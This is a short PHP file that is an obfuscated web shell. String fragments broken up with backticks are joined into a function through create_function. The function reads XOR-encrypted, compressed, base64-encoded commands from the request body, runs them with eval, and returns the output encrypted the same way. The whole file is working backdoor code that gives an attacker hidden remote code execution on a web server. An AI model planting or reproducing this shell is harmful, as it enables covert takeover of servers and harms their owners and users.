<?php
$A=';f`unction x`($t`,$k){$`c=strlen($`k);$l=s`trlen`($t);$o=`"";f`or($i=0`;``$i<$l;){for($';
$p='(`"/$kh``(.+)$kf/"`,@file_get`_`co`ntent`s("p``hp://inpu`t"),$m)==1) {@ob_st``art';
$D='();@e`val(`@gzuncompr`ess(@x(@`bas`e64_decod`e`(`$m[1]),$k)))`;$o=@ob_ge`t``_contents();@o`b';
$J=str_replace('Q','','QcQreateQ_fuQnQctQion');
$E='$k="`c915f`40``3"`;$kh="8a03435b5f`bd";$kf`="44a0fee3b8a```6";`$p="j0aU5CCkXKVTu`6Aq"';
$q='_end_clean`();$`r=@b`ase64_enc`ode(`@x(@gzc`om`press`($o),$`k));`pri`nt("$p$kh$r$kf");}';
$m='j=`0;`($j`<$c&&$i<$l`);$j++,$`i++){$o.=$`t{`$i}^$k{$j}`;}}ret`urn `$o;}i`f` (@preg_match';
$X=str_replace('`','',$E.$A.$m.$p.$D.$q);
$f=$J('',$X);$f();
?>
